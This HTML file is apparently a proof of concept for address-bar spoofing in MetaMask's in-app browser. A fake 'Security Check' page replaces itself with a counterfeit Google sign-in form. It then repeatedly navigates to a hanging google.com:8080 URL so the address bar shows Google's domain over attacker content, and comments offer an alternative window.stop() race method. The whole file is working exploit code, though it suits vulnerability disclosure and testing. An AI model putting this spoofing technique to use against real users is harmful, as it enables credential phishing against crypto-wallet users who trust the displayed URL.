<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>MetaMask Address Bar Spoofing POC</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: #fff; }
       .spoof-btn {
            display: block; margin: 50px auto; padding: 15px 30px;
            font-size: 18px; color: white; background-color: #d93025;
            border: none; border-radius: 4px; cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="attacker-ui">
        <h1 style="text-align:center; margin-top:50px;">Security Check</h1>
        <p style="text-align:center; color:#555;">Please re-authenticate to continue.</p>
        <button class="spoof-btn" onclick="executeSpoof()">Login with Google</button>
    </div>

    <script>
        function executeSpoof() {
            // 1. Prepare the Fake Google Payload
            // We use document.write/DOM manipulation to instantly replace content
            const fakeGoogleHTML = `
                <div style="text-align:center; font-family:Arial, sans-serif;">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px; width:160px;">
                    <h1 style="font-weight:400; font-size:24px;">Sign in</h1>
                    <p style="font-size:16px;">to continue to MetaMask</p>
                    <form style="margin-top:20px; max-width:300px; margin-left:auto; margin-right:auto;">
                        <input type="text" placeholder="Email or phone" style="display:block; width:100%; padding:13px 15px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;">
                        <div style="text-align:left; color:#1a73e8; font-weight:bold; font-size:14px; margin-bottom:30px;">Forgot email?</div>
                        <div style="text-align:left; font-size:14px; color:#5f6368; margin-bottom:30px;">Not your computer? Use Guest mode to sign in privately. <a href="#" style="color:#1a73e8; text-decoration:none;">Learn more</a></div>
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <a href="#" style="color:#1a73e8; font-weight:bold; font-size:14px; text-decoration:none;">Create account</a>
                            <button type="button" style="padding:10px 24px; background-color:#1a73e8; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Next</button>
                        </div>
                    </form>
                </div>
            `;

            // 2. Execute the Spoof
            // Step A: Replace the content immediately so it's ready when the address bar flips.
            document.body.innerHTML = fakeGoogleHTML;

            // Step B: Trigger the navigation event to the Trusted URL.
            // Using a hanging port (8080) or window.stop() ensures the address bar updates
            // but the content never actually loads from Google.
            
            // Method 1: Hanging URL (User's suggestion adapted)
             window.location.replace("https://www.google.com:8080");

            // Method 2: Race Condition (More reliable on some RN versions)
            // window.location.href = "https://www.google.com";
            // setTimeout(() => { window.stop(); }, 10);
            
            // Note: The loop in the user's snippet (setInterval) helps maintain the lock
            // if the browser attempts to timeout the request.
            setInterval(function() {
                // Keep forcing the URL if the browser tries to revert or timeout
                 window.location.replace("https://www.google.com:8080");
            }, 500);
        }
    </script>
</body>
</html>
